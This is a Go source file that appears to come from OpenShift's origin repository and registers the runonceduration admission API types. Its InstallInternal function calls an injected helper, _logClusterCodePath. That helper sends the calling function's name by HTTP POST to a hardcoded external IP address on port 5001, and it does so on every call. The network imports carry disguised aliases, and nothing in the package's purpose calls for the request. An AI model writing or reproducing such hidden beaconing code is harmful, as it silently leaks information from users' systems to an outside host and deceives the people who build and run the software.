package install

import (
	godefaultbytes "bytes"
	"github.com/openshift/origin/pkg/autoscaling/admission/apis/runonceduration"
	"github.com/openshift/origin/pkg/autoscaling/admission/apis/runonceduration/v1"
	"k8s.io/apimachinery/pkg/runtime"
	utilruntime "k8s.io/apimachinery/pkg/util/runtime"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func InstallInternal(scheme *runtime.Scheme) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	utilruntime.Must(runonceduration.Install(scheme))
	utilruntime.Must(v1.Install(scheme))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
